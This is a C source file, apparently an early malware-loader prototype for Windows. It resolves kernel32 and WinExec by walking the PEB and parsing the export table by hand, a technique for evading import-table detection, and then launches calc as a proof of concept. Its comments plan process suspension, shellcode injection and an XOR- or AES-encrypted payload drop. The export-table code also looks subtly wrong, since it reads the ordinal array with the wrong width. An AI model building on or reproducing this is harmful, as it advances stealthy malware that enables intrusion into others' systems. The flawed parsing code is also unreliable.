
#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <winnt.h>
#include <intrin.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")
#define g(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define e(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define i(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)




//
//
//
//
//
// import the right functions to pause / unpause thread
// - suspend current process
// - allocate new memory
// - inside new memory, dump shellcode
// - resume current process
//2 - write actual logic to do the fuck ass thread shit to get acccess to the process
//3 - drop my ENCRYPTED payload by xor or by double aes decrpyt encrpyt
// 4 - profit



size_t GetModHandle(wchar_t *ln) {
	PEB* pPeb = (PEB*)__readgsqword(0x60);
	PLIST_ENTRY header = &(pPeb->Ldr->InMemoryOrderModuleList);
	i("%p\n",pPeb);
	i("%p\n", header);
	


	for (PLIST_ENTRY curr = header->Flink; curr != header; curr = curr->Flink) {
		i("%p", curr);
		LDR_DATA_TABLE_ENTRY* data = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

		i("current node is: %ls\n", data->FullDllName.Buffer);

		if (StrStrIW(ln, data->FullDllName.Buffer)) {
			e("%ls is a match to %ls.", data->FullDllName.Buffer,ln);

			return data->DllBase;
		}
		else {
			e("%ls is not a match to %ls\n" , data->FullDllName.Buffer,ln);
		}


	}
	e("returning NULL value, failed to get dll");
	return 0;
	
}

size_t GetFuncAddr(size_t modb, char* fn) {

	PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)(modb);
	PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(modb + dosHdr->e_lfanew);
	IMAGE_OPTIONAL_HEADER opH = ntHdr->OptionalHeader;
	IMAGE_DATA_DIRECTORY data_Dir = opH.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(modb + data_Dir.VirtualAddress);

	i("Export Table: %p\n", exportTable);
	DWORD* arrf = (DWORD *)(modb + exportTable->AddressOfFunctions);
	DWORD* arrn = (DWORD*)(modb + exportTable->AddressOfNames);
	DWORD* arrno = (DWORD*)(modb + exportTable->AddressOfNameOrdinals);
	
	for (size_t i = 0; i < exportTable->NumberOfNames; i++) {
		char* name = (char*)(modb + arrn[i]);
		WORD numCAPIO = arrno[i] + 1;
		if (!stricmp(name, fn)) {
			g("Found ordinal %.4x - %s\n",numCAPIO, name);
			return modb + arrf[numCAPIO - 1];
		
		}
	
	}


	return 0;


}




int main(int argc, char** argv, char* envp) {
	size_t kernelBase = GetModHandle(L"C:\\WINDOWS\\System32\\KERNEL32.dll");
	g(" GetModHandle(kernel32.dll) = % p\n", kernelBase); 

	size_t ptr_WinExec = (size_t)GetFuncAddr(kernelBase, "WinExec");
	g(" GetFuncAddr(kernel32.dll, WinExec) = % p\n", ptr_WinExec); 
	((UINT(WINAPI*)(LPCSTR, UINT))ptr_WinExec)("calc", SW_SHOW);
	return 0;
}
